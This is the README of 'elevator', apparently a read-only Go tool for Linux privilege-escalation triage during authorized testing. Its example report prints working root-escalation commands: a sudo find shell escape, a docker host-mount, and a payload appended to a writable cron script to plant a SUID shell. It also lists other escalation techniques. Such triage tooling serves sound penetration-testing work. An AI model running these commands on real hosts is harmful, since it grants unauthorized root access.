# elevator

A read-only Linux **privilege-escalation triage** tool.

Run it on a host you are authorized to test. It enumerates local privesc routes —
sudo misconfigurations, SUID/SGID binaries, Linux capabilities, writable sensitive
files — correlates each to a known technique, and prints a **ranked report with the
exact command you would run**, a confidence rating, a blast-radius rating, and a
citation.

**It is emit-only. elevator finds and explains routes; it does not exploit them.**
You run the emitted commands yourself. This is deliberate:

- it mirrors how LinPEAS / linux-exploit-suggester / GTFOBins already work;
- it keeps a human at the trigger, so an unreliable route never fires unattended
  (the same reason you don't auto-run kernel exploits on a client's box);
- it keeps the tool squarely on the right side of "authorized assessment."

> For authorized security testing, CTF, and education only.

## Why a Go static binary

- **No runtime dependency.** A single static binary — no Python or other interpreter
  needed on the target. Drop it on a minimal or locked-down box and it just runs.
- **Effortless cross-compilation.** Build for amd64 / arm64 / 386 / … from one machine.
- **Offline.** No network, no phone-home.

## Build

```sh
go build -o elevator .

# static, stripped — recommended for dropping on other hosts:
CGO_ENABLED=0 go build -ldflags="-s -w" -o elevator .

# cross-compile, e.g. for arm64:
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o elevator-arm64 .
```

## Usage

```sh
./elevator                    # scan, ranked human-readable report
./elevator -json              # machine-readable, for piping / diffing
./elevator -roots /usr,/opt   # limit the filesystem walk (faster than scanning /)
./elevator -timeout 60s       # overall scan budget (default 2m)
./elevator -quiet             # suppress the banner
```

Each finding prints the evidence (what was detected), the exact command for **you**
to run, a confidence and blast-radius rating, and a reference. You decide and run it.

## Example

```text
$ elevator
elevator — read-only privesc triage. Emits commands for YOU to run; it does not exploit. Authorized use only.

Found 3 candidate route(s), ranked:

[1] Sudo-runnable find — GTFOBins shell escape
    category=sudo  confidence=high  blast=safe
    evidence : sudo -l: (root) NOPASSWD: /usr/bin/find
    run      :
      sudo /usr/bin/find . -exec /bin/sh \; -quit
    ref      : https://gtfobins.github.io/gtfobins/find/

[2] Member of 'docker' group — mount host filesystem as root
    category=group  confidence=high  blast=safe
    evidence : current user is in group 'docker'
    run      :
      docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    ref      : https://gtfobins.github.io/gtfobins/docker/

[3] Writable file run by root cron: /opt/maint/cleanup.sh
    category=cron  confidence=high  blast=reversible
    evidence : root-run cron script is writable: /opt/maint/cleanup.sh
    run      :
      # back up /opt/maint/cleanup.sh, append a root payload, e.g.:
      #   echo 'cp /bin/bash /tmp/.b && chmod +s /tmp/.b' >> /opt/maint/cleanup.sh
      # wait for the schedule, then:  /tmp/.b -p
    ref      : https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs
```

The banner is written to stderr; the report (or `-json`) goes to stdout, so
`elevator -json > routes.json` captures just the findings. elevator stops here —
it prints the routes and the commands; running them is up to you.

## Checks (current)

- **sudo** — parses `sudo -n -l` (a read-only listing; it never runs a sudo command)
  for NOPASSWD entries and unrestricted sudo, correlating binaries to GTFOBins, and
  flags `env_keep` configs that preserve `LD_PRELOAD` / `LD_LIBRARY_PATH`.
- **filesystem** — a single walk that finds SUID/SGID-root binaries (GTFOBins-correlated),
  Linux file capabilities that grant escalation (`cap_setuid`, `cap_dac_*`, …) read
  straight from the `security.capability` xattr (no `getcap` dependency), and
  non-standard SUID binaries that appear to call a helper by relative name
  (PATH-hijack candidates, via in-process string analysis — no `strings(1)`).
- **writable** — write access to `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`,
  and `/etc/sudoers.d/`.
- **cron** — writable root-run cron scripts and crontab-referenced paths; commands
  invoked by relative name while a writable directory is on the cron `PATH`; and
  wildcard arguments to abusable binaries (`tar`/`rsync`/`chown`/…) for wildcard injection.
- **systemd** — writable root service unit files, and writable `ExecStart` binaries
  of units that run as root.
- **groups** — membership in groups with a known route to root: `docker`, `lxd`/`lxc`,
  `disk`, `shadow`, `adm`.
- **nfs** — `/etc/exports` entries configured with `no_root_squash`.
- **kernel** — information-only LPE suggestions keyed on the running kernel version
  (DirtyCOW / DirtyPipe / OverlayFS) plus `pkexec`/PwnKit. These are version-keyed,
  marked `destructive`, and carry **no runnable command** — confirm the patch level
  and run anything manually.

Ideas for further checks (same `Check` pattern): systemd timers, D-Bus/polkit policy,
LD hijack on SUID binaries, wider GTFOBins coverage, and a richer kernel-CVE dataset.

## Blast radius

Findings are tagged:

- `safe` — deterministic, no host modification;
- `reversible` — bounded host change (back up the file first);
- `destructive` — may crash or corrupt the host (e.g. kernel exploits).

The report ranks reliable, safe routes first.

## Adding a route

Implement the `scan.Check` interface (`Name()` and `Detect(*Context) []Finding`) and
add it to `DefaultChecks()` in `internal/scan/check.go`. Each `Finding` carries the
operator command, confidence, blast-radius, and a citation; the report and JSON layers
are generic, so a new check needs no rendering code.

## Status

This is a rewrite of the original Python proof-of-concept (a gzip+hex payload packer)
into a Go triage tool. The legacy `elevator.py` / `exploit_encoder.py` remain for
reference and are superseded by this binary.
